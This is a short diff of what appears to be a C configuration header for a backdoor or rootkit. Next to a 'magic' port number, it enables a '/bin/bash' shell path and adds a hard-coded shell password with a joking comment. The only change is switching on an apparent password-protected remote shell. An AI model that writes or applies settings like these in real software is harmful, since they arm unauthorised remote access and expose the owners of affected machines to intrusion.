@@ -6,4 +6,5 @@
 #define MAGIC_PORT 5914
 
 /* Miscellaneous. */
-/* #define SHELL_PATH "/bin/bash" */
+#define SHELL_PATH "/bin/bash"
+#define SHELL_PASS "BRING IT TO ME"    /* Trance. :~) */
